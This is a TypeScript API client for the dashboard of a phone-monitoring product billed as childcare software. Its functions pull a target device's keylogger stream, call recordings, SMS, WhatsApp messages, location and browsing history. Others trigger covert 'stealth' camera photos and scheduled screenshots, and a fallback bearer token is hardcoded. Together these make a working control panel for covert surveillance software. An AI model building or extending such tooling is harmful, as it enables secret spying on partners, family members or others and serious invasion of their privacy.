// Relative API helper taking advantage of Vite server proxy (/api -> http://localhost:3000)
async function apiFetch<T>(endpoint: string, fallbackData: T, customHeaders: Record<string, string> = {}): Promise<T> {
  try {
    const cleanEndpoint = endpoint.startsWith('/') ? endpoint : `/${endpoint}`;
    // Ensures global prefix /api/v1/ is formatted correctly
    const path = cleanEndpoint.startsWith('/api/v1') 
      ? cleanEndpoint 
      : `/api/v1${cleanEndpoint.replace(/^\/api/, '')}`;

    const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';

    const response = await fetch(path, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Authorization': `Bearer ${token}`,
        ...customHeaders
      }
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const data = await response.json();
    return data as T;
  } catch (error) {
    console.warn(`[Dashboard API] Failed to fetch ${endpoint}. Using fallback state.`, error);
    return fallbackData;
  }
}

export const apiService = {
  // 1. Devices List
  async getDevices(fallback: any[]) {
    return apiFetch<any[]>('/api/v1/devices', fallback);
  },

  // 2. Parent User licenses (Authenticated via Bearer Token Header)
  async getLicenses(fallback: any[]) {
    return apiFetch<any[]>('/api/v1/licenses/my-licenses', fallback);
  },

  // 3. Purchase License Simulation
  async purchaseLicense(payload: { email: string; name?: string; packageName: string; months: number; amount: number }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const response = await fetch('/api/v1/licenses/purchase-simulate', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (err) {
      return { success: false, message: 'Connection error' };
    }
  },

  // 4. Calls Log
  async getCalls(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/calls/${deviceId}`, fallback);
  },

  // 5. SMS Log
  async getSms(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/sms/${deviceId}`, fallback);
  },

  // 6. Location History
  async getLocations(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/location/${deviceId}`, fallback);
  },

  // 7. Contacts Inventory
  async getContacts(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/contacts/${deviceId}`, fallback);
  },

  // 8. Keylogger Stream
  async getKeylogger(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/keylogger/${deviceId}`, fallback);
  },

  // 9. Installed Applications
  async getInstalledApps(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/installed-apps/${deviceId}`, fallback);
  },

  // 10. Internet History
  async getWebHistory(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/web-history/${deviceId}`, fallback);
  },

  // 11. Calendar Events
  async getCalendar(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/calendar/${deviceId}`, fallback);
  },

  // 12. Call Audio Recordings
  async getRecordings(deviceId: string, fallback: any[]) {
    return apiFetch<any[]>(`/api/v1/telemetry/recordings/${deviceId}`, fallback);
  },

  // 12.5 WhatsApp Telemetry Stream
  async getWhatsApp(deviceId: string, fallback: any[] = []) {
    return apiFetch<any[]>(`/api/v1/telemetry/whatsapp/${deviceId}`, fallback);
  },

  // 13. Policy: App Blocking
  async toggleAppBlock(payload: { deviceId: string; packageName: string; appName?: string; isBlocked: boolean }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/policy/apps/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'App policy connection error' };
    }
  },

  async getAppRules(deviceId: string) {
    return apiFetch<any[]>(`/api/v1/policy/apps/${deviceId}`, []);
  },

  // 14. Policy: Call Blocking
  async toggleCallBlock(payload: { deviceId: string; phoneNumber: string; contactName?: string; isBlocked: boolean }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/policy/calls/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Call policy connection error' };
    }
  },

  async getCallRules(deviceId: string) {
    return apiFetch<any[]>(`/api/v1/policy/calls/${deviceId}`, []);
  },

  // 15. Policy: Web Domain Filtering
  async toggleWebBlock(payload: { deviceId: string; domain: string; isBlocked: boolean }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/policy/web/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Web policy connection error' };
    }
  },

  async getWebRules(deviceId: string) {
    return apiFetch<any[]>(`/api/v1/policy/web/${deviceId}`, []);
  },

  // 16. Stealth Photo Command Trigger
  async triggerStealthPhoto(payload: { deviceId: string; camera: 'FRONT' | 'REAR' | 'BOTH' }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/commands/stealth-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Stealth photo connection error' };
    }
  },

  // 17. Command Statuses
  async getCommandStatuses(deviceId: string) {
    return apiFetch<{ success: boolean; statuses: Record<string, { status: string; error?: string; timestamp: number; camera?: 'FRONT' | 'REAR'; action?: string }> }>(
      `/api/v1/commands/status/${deviceId}`,
      { success: false, statuses: {} }
    );
  },

  // 18. Instant Screenshot Trigger
  async triggerScreenshot(payload: { deviceId: string }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/commands/screenshot', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Screenshot connection error' };
    }
  },

  // 19. Schedule Screenshot Captures Trigger
  async setScreenshotSchedule(payload: { deviceId: string; active: boolean; durationMin?: number; intervalSec?: number; startDelayMin?: number; startTime?: number }) {
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const res = await fetch('/api/v1/commands/screenshot/schedule', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return { success: false, message: 'Schedule connection error' };
    }
  },

  async getScreenshotSchedule(deviceId: string) {
    return apiFetch<{ success: boolean; schedule: { active: boolean; durationMin: number; intervalSec: number; startTime: number; stopTime: number; startDelayMin?: number } }>(
      `/api/v1/commands/screenshot/schedule/${deviceId}`,
      { success: false, schedule: { active: false, durationMin: 15, intervalSec: 30, startTime: 0, stopTime: 0, startDelayMin: 0 } }
    );
  }
};

